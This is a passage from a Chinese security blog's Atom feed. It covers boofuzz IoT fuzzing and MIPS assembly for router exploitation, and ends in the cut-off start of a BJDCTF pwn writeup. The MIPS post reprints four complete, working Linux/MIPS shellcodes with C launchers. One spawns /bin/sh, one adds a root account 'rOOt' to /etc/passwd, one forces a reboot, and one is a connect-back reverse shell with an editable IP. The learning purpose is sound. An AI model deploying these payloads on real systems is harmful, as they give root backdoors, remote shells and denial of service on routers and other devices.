class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(env) $ pip install boofuzz</span><br></pre></td></tr></table></figure><p>0x03 Boofuzz框架主要层</p><ul><li>数据生成：根据协议格式利用原语来构造请求</li><li>会话管理/驱动：将请求以图的形式链接起来形成会话，同时管理待测目标、代理、请求，还提供一个web界面用于监视和控制</li><li>代理：与目标进行交互以实现日志记录、对网络流量进行监控等<br>通常，代理是运行在目标设备上。但是，对于IoT设备而言，大部分情况下都无法在目标设备上运行代理程序。</li><li>实用工具：独立的命令行工具，完成一些其他的功能</li></ul><p>0x04 Boofuzz测试的主要步骤</p><ul><li>根据网络数据包构造请求</li><li>设置会话信息(包括测试目标的ip地址和端口等)，然后按照请求的先后顺序将其链接起来</li><li>添加对目标设备的监控和设备重启机制等</li><li>开始fuzz</li></ul><p>0x05 Boofuzz常用语法</p><ul><li>session():建立会话模块</li></ul><ul><li>s_initialize:初始化模块</li></ul><ul><li><p>call_back:回调函数</p><p>根据每个节点进行操作，定义回调函数以实现根据相应结果执行制</p></li></ul><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>后台 127.0.0.1:26000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boo open ./test.db</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会
      
    
    </summary>
    
      <category term="iot" scheme="https://nocbtm.github.io/categories/iot/"/>
    
    
      <category term="iot" scheme="https://nocbtm.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>mips 汇编语言</title>
    <link href="https://nocbtm.github.io/2020/06/06/mips-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    <id>https://nocbtm.github.io/2020/06/06/mips-汇编语言/</id>
    <published>2020-06-06T09:47:28.000Z</published>
    <updated>2020-06-11T00:55:46.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要着手去做一些路由器的漏洞复现，了解到路由器大多都是<code>mips</code>架构的，像<code>TP-Link</code>的路由器；</p><p>还有<code>arm</code>架构的，像华为，小米的路由器。</p><p>根据之前学习<code>X86</code>下的汇编和做过<code>arm-pwn</code>的经验，其实很容易掌握<code>mips</code>汇编，更容易抓住重点。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>1.<code>MIPS</code>使用定长指令，所有指令都是32位长的<br>2.1字节=8位，半字长=2个字节（32位），1字长=4个字节<br>3.一个字符空间=1个字节<br>4.一个整形=一个字长=4个字节<br>5.单个字符用单引号<br>6.字符串用双引号</p><h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>一共有32个寄存器一般用助记符表示</p><ul><li>MIPS下一共有32个通用寄存器</li><li>在汇编中，寄存器标志以$开头</li><li>寄存器表示可以有两种方式：<br>1.直接使用该寄存器对应的编号，例如：从$0到$31<br>2.使用对应的寄存器名称，例如t1,t1,sp，详见下文</li><li>对于以上两者，不存在直接寻址，必须通过<code>mfhi(“move from hi”)</code>和<code>mflo(“move from lo”)</code>分别来进行访问对应的内容。</li><li>栈的走向是从高地址向低地址</li></ul><p><img alt="" data-src="https://nocbtm.github.io/imgs/mips-asm-1.png" class="lozad"></p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><p>指令的话没必要全部都看反正看了也记不住，留一个基本的指令集来查询吧 <a href="https://blog.csdn.net/yixilee/article/details/4316617" target="_blank" rel="noopener">MIPS指令集</a></p><p>值得注意的是 <code>MIPS</code>有三种指令格式，而且所有的指令都是32位长，这点跟<code>X86</code>的很不一样。</p><p>通过写 <code>shellcode</code>可以更好的掌握汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sh=<span class="string">'''</span></span><br><span class="line">li $v0,<span class="number">0x6e69622f</span></span><br><span class="line">sw $v0,<span class="number">0</span>($sp)</span><br><span class="line">li $v0,<span class="number">0x0068732f</span></span><br><span class="line">sw $v0,<span class="number">4</span>($sp)</span><br><span class="line">addiu $a0,$sp,<span class="number">0</span></span><br><span class="line">li $v0,<span class="number">4011</span></span><br><span class="line">li $a1,<span class="number">0</span></span><br><span class="line">li $a2,<span class="number">0</span></span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Title:  Linux/MIPS - execve /bin/sh - 48 bytes</span></span><br><span class="line"><span class="comment">   Date:   2011-11-24</span></span><br><span class="line"><span class="comment">   Author: rigan - imrigan [at] gmail.com</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">        .text</span></span><br><span class="line"><span class="comment">        .global __start</span></span><br><span class="line"><span class="comment">__start:</span></span><br><span class="line"><span class="comment">        slti $a2, $zero, -1</span></span><br><span class="line"><span class="comment">        li $t7, 0x2f2f6269</span></span><br><span class="line"><span class="comment">        sw $t7, -12($sp)</span></span><br><span class="line"><span class="comment">        li $t6, 0x6e2f7368</span></span><br><span class="line"><span class="comment">        sw $t6, -8($sp)</span></span><br><span class="line"><span class="comment">        sw $zero, -4($sp)</span></span><br><span class="line"><span class="comment">        la $a0, -12($sp)</span></span><br><span class="line"><span class="comment">        slti $a1, $zero, -1</span></span><br><span class="line"><span class="comment">        li $v0, 4011</span></span><br><span class="line"><span class="comment">        syscall 0x40404</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> sc[] = &#123;</span><br><span class="line">        <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">/* slti    a2,zero,-1   */</span></span><br><span class="line">        <span class="string">"\x3c\x0f\x2f\x2f"</span>        <span class="comment">/* lui     t7,0x2f2f    */</span></span><br><span class="line">        <span class="string">"\x35\xef\x62\x69"</span>        <span class="comment">/* ori     t7,t7,0x6269 */</span></span><br><span class="line">        <span class="string">"\xaf\xaf\xff\xf4"</span>        <span class="comment">/* sw      t7,-12(sp)   */</span></span><br><span class="line">        <span class="string">"\x3c\x0e\x6e\x2f"</span>        <span class="comment">/* lui     t6,0x6e2f    */</span></span><br><span class="line">        <span class="string">"\x35\xce\x73\x68"</span>        <span class="comment">/* ori     t6,t6,0x7368 */</span></span><br><span class="line">        <span class="string">"\xaf\xae\xff\xf8"</span>        <span class="comment">/* sw      t6,-8(sp)    */</span></span><br><span class="line">        <span class="string">"\xaf\xa0\xff\xfc"</span>        <span class="comment">/* sw      zero,-4(sp)  */</span></span><br><span class="line">        <span class="string">"\x27\xa4\xff\xf4"</span>        <span class="comment">/* addiu   a0,sp,-12    */</span></span><br><span class="line">        <span class="string">"\x28\x05\xff\xff"</span>        <span class="comment">/* slti    a1,zero,-1   */</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xab"</span>        <span class="comment">/* li      v0,4011      */</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">/* syscall 0x40404      */</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="built_in">strlen</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Title:  Linux/MIPS - add user(UID 0) with password - 164 bytes</span></span><br><span class="line"><span class="comment"> * Date:   2011-11-24</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [at] gmail.com</span></span><br><span class="line"><span class="comment"> * Note:</span></span><br><span class="line"><span class="comment"> *         Username - rOOt</span></span><br><span class="line"><span class="comment"> *         Password - pwn3d</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> sc[] =</span><br><span class="line">        <span class="string">"\x24\x09\x73\x50"</span>       <span class="comment">//  li      t1,29520</span></span><br><span class="line">        <span class="string">"\x05\x30\xff\xff"</span>       <span class="comment">//  bltzal  t1,400094 &lt;L&gt;</span></span><br><span class="line">        <span class="string">"\x24\x09\x73\x50"</span>       <span class="comment">//  li      t1,29520 (nop)</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND); */</span></span><br><span class="line">        <span class="string">"\x3c\x0f\x30\x2f"</span>       <span class="comment">//  lui     t7,0x302f</span></span><br><span class="line">        <span class="string">"\x35\xef\x65\x74"</span>       <span class="comment">//  ori     t7,t7,0x6574</span></span><br><span class="line">        <span class="string">"\x3c\x0e\x63\x2f"</span>       <span class="comment">//  lui     t6,0x632f   </span></span><br><span class="line">        <span class="string">"\x35\xce\x70\x61"</span>       <span class="comment">//  ori     t6,t6,0x7061</span></span><br><span class="line">        <span class="string">"\x3c\x0d\x73\x73"</span>       <span class="comment">//  lui     t5,0x7373</span></span><br><span class="line">        <span class="string">"\x35\xad\x77\x64"</span>       <span class="comment">//  ori     t5,t5,0x7764</span></span><br><span class="line">        <span class="string">"\xaf\xaf\xff\xf3"</span>       <span class="comment">//  sw      t7,-13(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xae\xff\xf7"</span>       <span class="comment">//  sw      t6,-9(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xad\xff\xfb"</span>       <span class="comment">//  sw      t5,-5(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xa0\xff\xff"</span>       <span class="comment">//  sw      zero,-1(sp)</span></span><br><span class="line">        <span class="string">"\x27\xa4\xff\xf4"</span>       <span class="comment">//  addiu   a0,sp,-12</span></span><br><span class="line">        <span class="string">"\x24\x05\x01\x6d"</span>       <span class="comment">//  li      a1,365</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa5"</span>       <span class="comment">//  li      v0,4005</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">        <span class="string">"\xaf\xa2\xff\xfc"</span>       <span class="comment">//  sw      v0,-4(sp)</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* write(fd, "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n", 45); */</span></span><br><span class="line">        <span class="string">"\x8f\xa4\xff\xfc"</span>       <span class="comment">//  lw      a0,-4(sp)</span></span><br><span class="line">        <span class="string">"\x23\xe5\x10\x0c"</span>       <span class="comment">//  addi    a1,ra,4108</span></span><br><span class="line">        <span class="string">"\x20\xa5\xf0\x60"</span>       <span class="comment">//  addi    a1,a1,-4000</span></span><br><span class="line">        <span class="string">"\x24\x09\xff\xd3"</span>       <span class="comment">//  li      t1,-45</span></span><br><span class="line">        <span class="string">"\x01\x20\x30\x27"</span>       <span class="comment">//  nor     a2,t1,zero</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa4"</span>       <span class="comment">//  li      v0,4004</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">/* close(fd); */</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa6"</span>       <span class="comment">//  li      v0,4006</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* exit(0);  */</span></span><br><span class="line">        <span class="string">"\x28\x04\xff\xff"</span>        <span class="comment">//  slti    a0,zero,-1</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa1"</span>        <span class="comment">//  li      v0,4001</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">//  syscall 0x40404</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">/*  "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n" */</span></span><br><span class="line">        <span class="string">"\x72\x4f\x4f\x74"</span>       </span><br><span class="line">        <span class="string">"\x3a\x58\x4a\x31"</span>       </span><br><span class="line">        <span class="string">"\x47\x56\x2e\x6e"</span>       </span><br><span class="line">        <span class="string">"\x79\x46\x46\x4d"</span>       </span><br><span class="line">        <span class="string">"\x6f\x49\x3a\x30"</span>       </span><br><span class="line">        <span class="string">"\x3a\x30\x3a\x72"</span>       </span><br><span class="line">        <span class="string">"\x6f\x6f\x74\x3a"</span>       </span><br><span class="line">        <span class="string">"\x2f\x72\x6f\x6f"</span>      </span><br><span class="line">        <span class="string">"\x74\x3a\x2f\x62"</span>      </span><br><span class="line">        <span class="string">"\x69\x6e\x2f\x62"</span>       </span><br><span class="line">        <span class="string">"\x61\x73\x68\x0a"</span>;       </span><br><span class="line">       </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="built_in">strlen</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Linux/MIPS - reboot() - 32 bytes.</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [sobachka] gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] =          </span><br><span class="line">         <span class="string">"\x3c\x06\x43\x21"</span>       <span class="comment">// lui     a2,0x4321</span></span><br><span class="line">         <span class="string">"\x34\xc6\xfe\xdc"</span>       <span class="comment">// ori     a2,a2,0xfedc</span></span><br><span class="line">         <span class="string">"\x3c\x05\x28\x12"</span>       <span class="comment">// lui     a1,0x2812</span></span><br><span class="line">         <span class="string">"\x34\xa5\x19\x69"</span>       <span class="comment">// ori     a1,a1,0x1969</span></span><br><span class="line">         <span class="string">"\x3c\x04\xfe\xe1"</span>       <span class="comment">// lui     a0,0xfee1</span></span><br><span class="line">         <span class="string">"\x34\x84\xde\xad"</span>       <span class="comment">// ori     a0,a0,0xdead</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xf8"</span>       <span class="comment">// li      v0,4088</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>;      <span class="comment">// syscall 0x40404 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="keyword">sizeof</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Linux/MIPS - connect back shellcode (port 0x7a69) - 168 bytes.</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [sobachka] gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] =</span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3</span></span><br><span class="line">         <span class="string">"\x01\xe0\x20\x27"</span>        <span class="comment">// nor     a0,t7,zero</span></span><br><span class="line">         <span class="string">"\x01\xe0\x28\x27"</span>        <span class="comment">// nor     a1,t7,zero</span></span><br><span class="line">         <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">// slti    a2,zero,-1</span></span><br><span class="line">         <span class="string">"\x24\x02\x10\x57"</span>        <span class="comment">// li      v0,4183 ( sys_socket )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\xaf\xa2\xff\xff"</span>        <span class="comment">// sw      v0,-1(sp)</span></span><br><span class="line">         <span class="string">"\x8f\xa4\xff\xff"</span>        <span class="comment">// lw      a0,-1(sp)</span></span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3 ( sa_family = AF_INET )</span></span><br><span class="line">         <span class="string">"\x01\xe0\x78\x27"</span>        <span class="comment">// nor     t7,t7,zero</span></span><br><span class="line">         <span class="string">"\xaf\xaf\xff\xe0"</span>        <span class="comment">// sw      t7,-32(sp) </span></span><br><span class="line">         <span class="string">"\x3c\x0e\x7a\x69"</span>        <span class="comment">// lui     t6,0x7a69 ( sin_port = 0x7a69 )</span></span><br><span class="line">         <span class="string">"\x35\xce\x7a\x69"</span>        <span class="comment">// ori     t6,t6,0x7a69</span></span><br><span class="line">         <span class="string">"\xaf\xae\xff\xe4"</span>        <span class="comment">// sw      t6,-28(sp)</span></span><br><span class="line">         </span><br><span class="line">      <span class="comment">/* ====================  You can change ip here ;) ====================== */</span></span><br><span class="line">         <span class="string">"\x3c\x0d\xc0\xa8"</span>        <span class="comment">// lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ... </span></span><br><span class="line">         <span class="string">"\x35\xad\x01\x64"</span>        <span class="comment">// ori     t5,t5,0x164           ...0164 )</span></span><br><span class="line">      <span class="comment">/* ====================================================================== */</span></span><br><span class="line">      </span><br><span class="line">         <span class="string">"\xaf\xad\xff\xe6"</span>        <span class="comment">// sw      t5,-26(sp)</span></span><br><span class="line">         <span class="string">"\x23\xa5\xff\xe2"</span>        <span class="comment">// addi    a1,sp,-30</span></span><br><span class="line">         <span class="string">"\x24\x0c\xff\xef"</span>        <span class="comment">// li      t4,-17 ( addrlen = 16 )     </span></span><br><span class="line">         <span class="string">"\x01\x80\x30\x27"</span>        <span class="comment">// nor     a2,t4,zero </span></span><br><span class="line">         <span class="string">"\x24\x02\x10\x4a"</span>        <span class="comment">// li      v0,4170 ( sys_connect ) </span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3</span></span><br><span class="line">         <span class="string">"\x01\xe0\x28\x27"</span>        <span class="comment">// nor     a1,t7,zero</span></span><br><span class="line">         <span class="string">"\x8f\xa4\xff\xff"</span>        <span class="comment">// lw      a0,-1(sp)</span></span><br><span class="line"><span class="comment">//dup2_loop:</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xdf"</span>        <span class="comment">// li      v0,4063 ( sys_dup2 )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line">         <span class="string">"\x20\xa5\xff\xff"</span>        <span class="comment">// addi    a1,a1,-1</span></span><br><span class="line">         <span class="string">"\x24\x01\xff\xff"</span>        <span class="comment">// li      at,-1</span></span><br><span class="line">         <span class="string">"\x14\xa1\xff\xfb"</span>        <span class="comment">// bne     a1,at, dup2_loop</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">// slti    a2,zero,-1</span></span><br><span class="line">         <span class="string">"\x3c\x0f\x2f\x2f"</span>        <span class="comment">// lui     t7,0x2f2f</span></span><br><span class="line">         <span class="string">"\x35\xef\x62\x69"</span>        <span class="comment">// ori     t7,t7,0x6269</span></span><br><span class="line">         <span class="string">"\xaf\xaf\xff\xf4"</span>        <span class="comment">// sw      t7,-12(sp)</span></span><br><span class="line">         <span class="string">"\x3c\x0e\x6e\x2f"</span>        <span class="comment">// lui     t6,0x6e2f</span></span><br><span class="line">         <span class="string">"\x35\xce\x73\x68"</span>        <span class="comment">// ori     t6,t6,0x7368</span></span><br><span class="line">         <span class="string">"\xaf\xae\xff\xf8"</span>        <span class="comment">// sw      t6,-8(sp)</span></span><br><span class="line">         <span class="string">"\xaf\xa0\xff\xfc"</span>        <span class="comment">// sw      zero,-4(sp)</span></span><br><span class="line">         <span class="string">"\x27\xa4\xff\xf4"</span>        <span class="comment">// addiu   a0,sp,-12</span></span><br><span class="line">         <span class="string">"\x28\x05\xff\xff"</span>        <span class="comment">// slti    a1,zero,-1</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xab"</span>        <span class="comment">// li      v0,4011 ( sys_execve )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>;       <span class="comment">// syscall 0x40404</span></span><br><span class="line">         </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="keyword">sizeof</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reference：</p><p><a href="http://edu.i-soft.com.cn/doc/longxin-2017/02-1MIPS指令与汇编.pdf" target="_blank" rel="noopener">MIPS指令与汇编.pdf</a></p><p><a href="https://blog.csdn.net/u012837895/article/details/79855896" target="_blank" rel="noopener">MIPS汇编快速入门</a></p><p><a href="https://n132.github.io/2020/04/10/mips-Assembly-Language/" target="_blank" rel="noopener">mips_Assembly_Language</a></p><p><a href="https://blog.csdn.net/yixilee/article/details/4316617" target="_blank" rel="noopener">MIPS指令集</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近要着手去做一些路由器的漏洞复现，了解到路由器大多都是&lt;code&gt;mips&lt;/code&gt;架构的，像&lt;code&gt;TP-Link&lt;/code&gt;
      
    
    </summary>
    
      <category term="mips" scheme="https://nocbtm.github.io/categories/mips/"/>
    
    
      <category term="mips" scheme="https://nocbtm.github.io/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/</id>
    <published>2020-05-25T02:24:25.000Z</published>
    <updated>2020-05-25T03:56:16.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="盲打1-盲打2"><a href="#盲打1-盲打2" class="headerlink" title="盲打1 盲打2"></a>盲打1 盲打2</h2><p>都是一个c语言解释器，但是不能用<code>()</code>来写c语言，也就是不能调用函数，可以用shellcode的方式来写 orw flag,</p><p>原理参考<a href="https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/">对hello world的重新认识</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 